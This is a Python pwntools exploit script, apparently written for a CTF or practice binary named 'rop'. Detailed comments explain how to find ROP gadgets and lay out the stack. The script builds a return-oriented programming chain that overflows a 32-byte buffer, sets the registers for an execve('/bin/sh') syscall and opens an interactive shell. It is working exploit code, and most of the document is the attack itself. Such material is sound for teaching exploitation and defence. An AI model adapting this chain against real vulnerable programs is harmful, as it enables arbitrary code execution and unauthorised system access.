from pwn import *

# Notes
#  * Use [ROPGadget](https://github.com/JonathanSalwan/ROPgadget)
#  * `ROPGadget --binary rop > rop_gadgets`
#  * grep around in `rop_gadgets` for `int 0x80`, `pop e[abcd]x`
#  * `ROPGadget --binary rop --string "/bin/sh"`
#  * Our goal is to make the syscall `execve` with the argument `/bin/sh`
#  * This is 32-bit x86, so the calling convention is as follows:
#    * syscalls are the assembly instruction `int 0x80`
#    * the syscall number (0xb for `execve`) is passed in `eax`
#    * arguments are passed via registers in the order `ebx, ecx, edx, esi, edi`
#    * we need `ebx` to point to `/bin/sh` and we need `ecx` and `edx` to be 0
#  * To set our registers we look for ROP gadgets that pop registers off
#    the stack and then return. We can then add the appropriate values on
#    the stack which will then get popped off and set.
#  * The following exploit uses two such gadgets. One, which we call `popeax`
#    executes: `pop eax ; ret`. The other, which we call `popexx` executes:
#    `pop edx ; pop ecx ; pop ebx; ret`.
#
# Our stack looks like:
#
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA (buffer)  |
#    +----------------+
#    | BBBB (old ebp) |
#    +----------------+
#    | ret1 (popexx)  |
#    +----------------+
#    |    0 (edx)     |
#    +----------------+
#    |    0 (ecx)     |
#    +----------------+
#    | /bin/sh (ebx)  |
#    +----------------+
#    | ret2 (popeax)  |
#    +----------------+
#    |  0xb (eax)     |
#    +----------------+
#    |    syscall     |
#    ------------------

syscall = 0x0806d905
popeax  = 0x080b9236
popexx  = 0x0806fd50
binsh   = 0x080bc6a5

ropchain = "A" * 32 + "B" * 4 + p32(popexx) + p32(0) + p32(0) + p32(binsh) + p32(popeax) + p32(0xb) + p32(syscall)

r = process('./rop')
r.send(ropchain)
r.interactive()
